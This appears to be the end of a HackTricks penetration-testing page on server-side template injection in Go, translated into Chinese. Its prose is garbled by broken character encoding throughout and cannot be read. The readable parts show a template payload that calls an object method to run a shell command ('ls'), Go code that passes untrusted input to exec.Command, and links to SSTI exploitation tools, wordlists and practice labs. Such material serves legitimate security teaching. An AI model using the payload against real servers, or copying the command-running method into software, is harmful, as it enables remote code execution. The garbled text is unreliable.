å¦‚æœä½ æƒ³é€šè¿‡SSTIåœ¨Goä¸­æ‰¾åˆ°ä¸€ä¸ªRCEï¼Œä½ åº”è¯¥çŸ¥é“ï¼Œç”±äºä½ å¯ä»¥é€šè¿‡`{{ . }}`è®¿é—®ä¼ é€’ç»™æ¨¡æ¿çš„ç»™å®šå¯¹è±¡ï¼Œä½ ä¹Ÿå¯ä»¥**è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•**ã€‚å› æ­¤ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œä¼ é€’çš„å¯¹è±¡æœ‰ä¸€ä¸ªåä¸ºSystemçš„æ–¹æ³•æ¥æ‰§è¡Œç»™å®šçš„å‘½ä»¤ï¼Œä½ å¯ä»¥è¿™æ ·æ»¥ç”¨å®ƒï¼š`{{ .System "ls" }}`\
å› æ­¤ï¼Œä½ å¯èƒ½**éœ€è¦æºä»£ç **ã€‚ç±»ä¼¼äºè¿™ç§æƒ…å†µçš„æ½œåœ¨æºä»£ç å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**æ›´å¤šä¿¡æ¯**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### æ›´å¤šåˆ©ç”¨

æŸ¥çœ‹ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) è·å–æ›´å¤šåˆ©ç”¨ã€‚æ‚¨è¿˜å¯ä»¥åœ¨ [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI) ä¸­æ‰¾åˆ°æœ‰è¶£çš„æ ‡ç­¾ä¿¡æ¯ã€‚

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## ç›¸å…³å¸®åŠ©

å¦‚æœæ‚¨è®¤ä¸ºæœ‰ç”¨ï¼Œè¯·é˜…è¯»ï¼š

* [FlaskæŠ€å·§](../../network-services-pentesting/pentesting-web/flask.md)
* [Pythoné­”æœ¯å‡½æ•°](broken-reference/)

## å·¥å…·

{% embed url="https://github.com/Hackmanit/TInjA" %}

{% embed url="https://github.com/vladko312/sstimap" %}

{% embed url="https://github.com/epinna/tplmap" %}

{% embed url="https://github.com/Hackmanit/template-injection-table" %}

## æš´åŠ›æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## ç»ƒä¹ ä¸å‚è€ƒ

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹ä¼šè®®ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
